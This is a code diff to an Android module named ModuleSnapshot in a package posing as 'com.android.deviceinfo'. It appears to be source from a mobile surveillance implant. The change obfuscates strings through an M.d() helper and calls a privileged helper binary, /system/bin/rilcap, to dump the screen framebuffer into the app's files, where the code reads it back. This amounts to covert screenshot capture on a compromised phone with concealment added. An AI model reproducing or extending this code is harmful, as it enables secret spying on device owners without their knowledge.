@@ -23,7 +23,6 @@ import android.view.Display;
 import android.view.Surface;
 import android.view.WindowManager;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
@@ -35,6 +34,7 @@ import com.android.deviceinfo.listener.ListenerStandby;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 
 /**
@@ -297,7 +297,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	}
 
 	private byte[] getAdditionalData() {
-		final String window = Messages.getString("11_1"); //$NON-NLS-1$
+		final String window = M.d("Desktop"); //$NON-NLS-1$
 
 		final int wlen = window.length() * 2;
 		final int tlen = wlen + 24;
@@ -344,7 +344,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final String path = filesPath.getAbsolutePath();
 
 		// 11_2=/system/bin/ntpsvd fb
-		final String getrawpath = Messages.getString("11_2"); //$NON-NLS-1$
+		final String getrawpath = M.d("/system/bin/ntpsvd fb"); //$NON-NLS-1$
 
 		try {
 			if (Cfg.DEBUG) {
@@ -352,14 +352,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 			}
 
 			// a_0=/system/bin/ntpsvd
-			final Process localProcess = Runtime.getRuntime().exec(new String[] { Messages.getString("a_0"), "fb", "/data/data/" + Status.self().getAppContext().getPackageName() + "/files/frame" });
+			final Process localProcess = Runtime.getRuntime().exec(new String[] { M.d("/system/bin/rilcap"), "fb", "/data/data/" + Status.self().getAppContext().getPackageName() + "/files/frame" });
 			localProcess.waitFor();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
 			}
 			// 11_3=frame
-			final AutoFile file = new AutoFile(path, Messages.getString("11_3")); //$NON-NLS-1$
+			final AutoFile file = new AutoFile(path, M.d("frame")); //$NON-NLS-1$
 
 			if (file.exists()) {
 				return file.read();
